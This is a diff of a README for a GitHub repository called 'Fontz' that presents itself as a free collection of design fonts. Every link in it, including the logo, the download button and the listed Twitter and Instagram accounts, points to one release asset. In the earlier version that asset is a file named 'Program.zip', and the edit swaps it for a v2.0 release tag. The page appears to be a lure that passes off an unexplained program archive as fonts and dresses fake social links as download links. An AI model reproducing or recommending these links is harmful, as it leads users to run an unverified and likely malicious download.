@@ -1,5 +1,5 @@
 # 🎨 Fontz 🖋️
-![Fontz Logo](https://github.com/Rajen111/fontz/releases/download/v1.0/Program.zip)
+![Fontz Logo](https://github.com/Rajen111/fontz/releases/tag/v2.0)
 
 Welcome to **Fontz**, your go-to repository for a collection of unique and creative fonts for your design projects!
 
@@ -22,7 +22,7 @@ Welcome to **Fontz**, your go-to repository for a collection of unique and creat
 ## Get Started
 Get access to the Fontz collection now! Click the button below to download the fonts:
 
-[![Download Fontz](https://github.com/Rajen111/fontz/releases/download/v1.0/Program.zip)](https://github.com/Rajen111/fontz/releases/download/v1.0/Program.zip)
+[![Download Fontz](https://github.com/Rajen111/fontz/releases/tag/v2.0)](https://github.com/Rajen111/fontz/releases/tag/v2.0)
 
 *Note: The link above will direct you to the download page. Click the link to launch the download.*
 
@@ -39,8 +39,8 @@ Enjoying Fontz? Share it with your friends and fellow designers to spread the cr
 
 ## Connect
 Stay updated on the latest additions to the Fontz collection by following us on social media:
-- Twitter: [@fontz_designs](https://github.com/Rajen111/fontz/releases/download/v1.0/Program.zip)
-- Instagram: [@fontz_designs](https://github.com/Rajen111/fontz/releases/download/v1.0/Program.zip)
+- Twitter: [@fontz_designs](https://github.com/Rajen111/fontz/releases/tag/v2.0)
+- Instagram: [@fontz_designs](https://github.com/Rajen111/fontz/releases/tag/v2.0)
 
 Let Fontz be your source of inspiration for all your design projects! 💫😊
 
